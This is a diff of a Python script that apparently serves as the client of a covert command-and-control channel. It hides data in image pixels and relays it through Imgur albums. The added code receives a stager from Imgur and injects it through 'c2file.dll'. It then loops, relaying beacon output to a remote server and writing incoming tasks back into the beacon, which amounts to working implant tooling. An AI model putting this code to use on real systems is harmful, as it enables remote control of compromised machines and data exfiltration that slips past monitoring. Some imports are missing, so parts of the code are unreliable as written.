@@ -1,3 +1,12 @@
+from ctypes import *
+from ctypes.wintypes import *
+import sys
+import os
+import struct
+
+# Encoder imports:
+
+# Transport imports:
 from imgurpython import ImgurClient
 import PIL
 from PIL import Image
@@ -9,10 +18,6 @@ import base64
 import requests
 import zlib
 
-# YOU NEED TO GET A TOKEN FOR YOUR APPLICATION FIRST.=
-# SET UP YOUR ACCOUNT.
-
-
 # <START OF GHETTO CONFIG SECTION>
 TOKEN_LEN = 81 # Don't change this
 USERNAME = ''
@@ -20,14 +25,39 @@ client_id = ''
 client_secret = ''
 access_token = ''
 refresh_token = ''
+VERSION = 0
 # </END OF GHETTO CONFIG SECTION>
 
-# Server's transport will handle access tokens and whatnot.
+# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
+# <encoder functions>
+def encode(data, photo_id=1, list_size=1):
+	img = Image.new('RGB', (4320,4320), color = 'red')
+	pix = img.load()
+	x = 1
+	for byte in data:
+		pix[x,x] = (pix[x,x][0], pix[x,x][1], ord(byte))
+		x = x + 1
+		pass
+	pix[0,0] = (VERSION, photo_id, list_size)
+	image_list.append(img.load)
+	img_byte_array = StringIO()
+	img.save(img_byte_array, format='PNG')
+	return img_byte_array
 
-# client's prepTransport will have to handle token refreshes. 
-# TODO: Client won't last more than a month without this logic.
-#   - need to add authtoken refresh logic
+def decode(image):
+	stego_pix = image.load()
+	byte_list = []
+	
+	for y in range(1, image.size[1]):
+		# Add our byte we wnat
+		byte_list.append(chr(stego_pix[y,y][2]))
+	pass
 
+	return ''.join(byte_list)
+
+# </encoder functions>
+
+# <transport functions>
 def resetAccount():
 	account_albums = client.get_account_albums(USERNAME)
 	for album in account_albums:
@@ -36,7 +66,7 @@ def resetAccount():
 			client.delete_image(image.id)
 		client.album_delete(album.id)
 
-def prepClientTransport():
+def prepTransport():
 	global client
 	client = ImgurClient(client_id, client_secret)
 
@@ -107,93 +137,6 @@ def checkStatus(silent=True):
 		checkStatus()
 	return credits
 
-
-def sendTokens(tokens):
-	# Sends tokens in plain text. Eventually, I'd like to get it so I can
-	# just pass it to the encoder, but this works for a prototype
-		
-	img = Image.new('RGB', (4320,4320), color = 'red')
-	pix = img.load()
-	token_list = list(tokens)
-	token_list = bytearray(str(token_list[0]) + "," + str(token_list[1]))
-	for byte in token_list:
-		for x in range(1, len(token_list) + 1):
-			byte = token_list[x-1]
-			# Write the byte to the blue value in the pixel
-			pix[x,x] = (pix[x,x][0], pix[x,x][1], byte)
-			x = x + 1
-		pass
-	# Insert a UPDATE_TOKENS header
-	pix[0,0] = (1, 1, 1)
-	# Upload image to new album
-	fields = {}
-	fields = { 'title': "TK4U", 'privacy': "public"}
-	album_object = client.create_album(fields)
-	fields.update({"id": album_object['id']})
-
-	# Upload our image to the album
-	img_byte_array = StringIO()
-	img.save(img_byte_array, format='PNG')
-
-	image_upload_fields = {}
-	image_upload_fields = {'image': base64.b64encode(img_byte_array.getvalue()), 'type': 'base64', 'album': album_object['id']}
-	y = client.make_request('POST', 'upload', image_upload_fields)
-
-
-	# I know this is a very weird looking loop, but it was to fix a very weird bug
-	while True:
-		account_albums = client.get_account_albums(USERNAME)
-		try:
-			if account_albums[0].id:
-				for album in account_albums:
-					if album.id == album_object['id']:
-						print "Album still exists, waiting 60 seconds for client to send new album"
-						time.sleep(60)
-						continue
-			else:
-				break
-		except IndexError:
-			break
-
-	# Return the token's album hash
-	return 0
-
-
-def prepTransport():
-	global client
-	client = ImgurClient(client_id, client_secret)
-
-	# Auth to imgur
-	authorization_url = client.get_auth_url('token')
-
-	print "Go to the following URL: {0}".format(authorization_url)
-	try:
-		token_url = raw_input("Insert the url you were redirected to with all parameters: ")
-	except:
-		token_url = input("Insert the url you were redirected to with all parameters: ")
-
-	parsed = urlparse.urlparse(token_url)
-
-	access_token = urlparse.parse_qs(parsed.fragment)['access_token'][0]
-	refresh_token = urlparse.parse_qs(parsed.fragment)['refresh_token'][0]
-	client.set_user_auth(access_token, refresh_token)
-
-	if client.get_email_verification_status(USERNAME) == False:
-		print "ERROR: YOU NEED TO VERIFY YOUR EMAIL. We'll send a verification request."
-		client.send_verification_email(USERNAME)
-		print "Verification email sent. Exiting..."
-		exit(1)
-
-	# Sending access and refresh token to client
-	token_list = []
-	token_list.append(access_token)
-	token_list.append(refresh_token)
-	token_album_hash = sendTokens(token_list)
-
-	# Client has recieved the tokens
-	return 0
-
-
 def sendData(data):
 	# Transport will receiving a list of images
 	# Application will have already encoded the data
@@ -206,7 +149,7 @@ def sendData(data):
 	fields.update({"id": album_object['id']})
 
 	data = base64.b64encode(zlib.compress(data, 9))
-	data_list = [data[i:i+4219] for i in range(0, len(data), 4219)]
+	data_list = [data[i:i+1079] for i in range(0, len(data), 1079)]
 
 	photo_id = 1
 	image_upload_fields = {'type': 'base64', 'album': album_object['id']}
@@ -230,7 +173,7 @@ def sendData(data):
 			time.sleep(300)
 
 
-def retrieveData():
+def recvData():
 	# Check for new albums
 	while True:
 		try:
@@ -262,3 +205,86 @@ def retrieveData():
 	# Now lets unbase64 and decompress this data
 	raw_data = zlib.decompress(base64.b64decode(final_data))
 	return raw_data
+
+# </transport functions>
+
+maxlen = 1024*1024
+
+lib = CDLL('c2file.dll')
+
+lib.start_beacon.argtypes = [c_char_p,c_int]
+lib.start_beacon.restype = POINTER(HANDLE)
+def start_beacon(payload):
+	return(lib.start_beacon(payload,len(payload)))  
+
+lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
+lib.read_frame.restype = c_int
+def ReadPipe(hPipe):
+	mem = create_string_buffer(maxlen)
+	l = lib.read_frame(hPipe,mem,maxlen)
+	if l < 0: return(-1)
+	chunk=mem.raw[:l]
+	return(chunk)  
+
+lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
+lib.write_frame.restype = c_int
+def WritePipe(hPipe,chunk):
+	sys.stdout.write('wp: %s\n'%len(chunk))
+	sys.stdout.flush()
+	print chunk
+	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
+	sleep(3) 
+	print "ret=%s"%ret
+	return(ret)
+
+def go():
+	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
+	print "Waiting for stager..." # DEBUG
+	p = recvData()
+	print "Got a stager! loading..."
+	sleep(2)
+	# print "Decoded stager = " + str(p) # DEBUG
+	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
+	handle_beacon = start_beacon(p)
+
+	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
+	print "Loaded, and got handle to beacon. Getting METADATA."
+
+	return handle_beacon
+
+def interact(handle_beacon):
+	while(True):
+		sleep(1.5)
+		
+		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
+		chunk = ReadPipe(handle_beacon)
+		if chunk < 0:
+			print 'readpipe %d' % (len(chunk))
+			break
+		else:
+			print "Received %d bytes from pipe" % (len(chunk))
+		print "relaying chunk to server"
+		sendData(chunk)
+
+		# LOGIC TO CHECK FOR A NEW TASK
+		print "Checking for new tasks from transport"
+		
+		newTask = recvData()
+
+		print "Got new task: %s" % (newTask)
+		print "Writing %s bytes to pipe" % (len(newTask))
+		r = WritePipe(handle_beacon, newTask)
+		print "Write %s bytes to pipe" % (r)
+
+# Prepare the transport module
+prepTransport()
+
+#Get and inject the stager
+handle_beacon = go()
+
+# run the main loop
+try:
+	interact(handle_beacon)
+except KeyboardInterrupt:
+	print "Caught escape signal"
+	sys.exit(0)
